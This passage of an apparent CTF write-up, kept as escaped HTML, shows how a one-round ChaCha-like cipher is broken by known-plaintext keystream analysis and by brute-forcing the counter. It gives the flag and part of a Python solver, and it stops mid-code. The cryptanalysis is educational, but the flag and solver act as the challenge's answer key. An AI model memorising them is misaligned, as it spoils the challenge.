&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;counter &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;13.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Save the initial state.&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apply up to 8 single quarter-rounds&lt;/strong&gt; (from a list) based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rounds&lt;/code&gt; value:
    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;qr_operations_sequence&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;bp&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Add the original state back to the modified state&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Convert the state into bytes&lt;/strong&gt; and return it.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The resulting 64-byte block is XOR-ed with the message bytes to encrypt or decrypt.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;known-plaintext-ciphertext-analysis&quot;&gt;Known Plaintext-Ciphertext Analysis&lt;/h2&gt;

&lt;p&gt;The challenge gave use a json which has ~60 plaintext/ciphertext pairs using the same key and plaintext but different counters and nonces (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000010...&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000020...&lt;/code&gt;). This gave us insight into how the keystream evolves with counter changes.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;how-to-solve&quot;&gt;How to Solve&lt;/h2&gt;

&lt;p&gt;The flag ciphertext was given in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf_challenge_package.json&lt;/code&gt;. We were given:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;strong&gt;key&lt;/strong&gt; is known.&lt;/li&gt;
  &lt;li&gt;The &lt;strong&gt;nonce&lt;/strong&gt; used for the flag could be one of the many seen in training.&lt;/li&gt;
  &lt;li&gt;The &lt;strong&gt;counter&lt;/strong&gt; is unknown.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-trick&quot;&gt;🔑 Trick&lt;/h3&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_bytes&lt;/code&gt; function could also be used for decryption.&lt;/p&gt;

&lt;p&gt;Just by using a sample &lt;strong&gt;nonce = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000010000000000000000000&lt;/code&gt;&lt;/strong&gt; and a random counter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, we could recover more than a half of the flag.&lt;/p&gt;

&lt;p&gt;We brute-forced the &lt;strong&gt;counter&lt;/strong&gt; by regenerating keystream blocks for increasing values, and XOR-ing them against the flag ciphertext until we found a meaningful ASCII string starting with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTF{&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;4-flag&quot;&gt;4. Flag&lt;/h2&gt;

&lt;p&gt;After brute-forcing the correct counter value (with fixed key and nonce), we obtained:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CTF{w3_aRe_g0Nn@_ge7_MY_FuncKee_monkey_!!}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;✅ DONE&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;5-key-points&quot;&gt;5. Key Points&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;The cipher is ChaCha-like, but weak due to:
    &lt;ul&gt;
      &lt;li&gt;Very few rounds (only 1 round used in the challenge).&lt;/li&gt;
      &lt;li&gt;Entire keystream block predictable and brute-forceable.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Known-plaintext keystream recovery made it easy to test candidate counter values.&lt;/li&gt;
  &lt;li&gt;Only 96-bit nonces and 32-bit counters — practical to brute-force if reduced rounds are used.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;takeaways&quot;&gt;Takeaways&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Modified ciphers often introduce weaknesses even if based on strong primitives.&lt;/li&gt;
  &lt;li&gt;Stream ciphers + known plaintext = keystream recovery.&lt;/li&gt;
  &lt;li&gt;With known key and enough samples, brute-forcing a 32-bit counter is very feasible.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;solver&quot;&gt;Solver&lt;/h3&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathlib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;CHACHA_CONSTANTS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1634760805&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;857760878&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2036477234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1797285236&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rotl32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Rotate a 32-bit unsigned integer left by c bits.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4294967295&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4294967295&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Add two 32-bit unsigned integers, wrapping modulo 2^32.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4294967295&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytes_to_words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Convert a byte string (little-endian) to a list of 32-bit words.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Input bytes length must be a multiple of 4 for word conversion.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;words_to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Convert a list of 32-bit words to a little-endian byte string.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    Mixes Bits. Modifies state_list in-place.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#print(&quot;mix_bits 0&quot;, a, b, c, d)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rotl32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rotl32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rotl32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rotl32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#print(&quot;mix_bits 1&quot;, a, b, c, d)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

